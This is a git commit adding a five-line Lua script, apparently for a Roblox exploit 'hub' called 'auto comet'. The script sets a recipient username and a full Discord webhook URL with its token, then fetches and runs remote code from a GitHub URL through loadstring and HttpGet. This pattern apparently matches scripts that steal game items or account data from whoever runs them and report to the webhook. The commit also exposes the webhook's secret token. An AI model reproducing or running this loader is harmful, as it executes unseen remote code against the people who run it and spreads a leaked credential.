852b5b2882514c2a15435543d01b1a7339293b97
aekhalism <133611896+aekhalism@users.noreply.github.com>
2023-05-15 07:42:21 +0700

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,5 @@
+_G.Username = "muaxuan1204"
+_G.HubName = "auto comet"
+_G.WebhookUrl = "https://discordapp.com/api/webhooks/1107132008775286834/5qTqO1pmibA7H5c9eedKDSn22cME7uSDwYyfS_mnT5Ut0jrkJWLdQyPhuvZXvL9l84l6"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
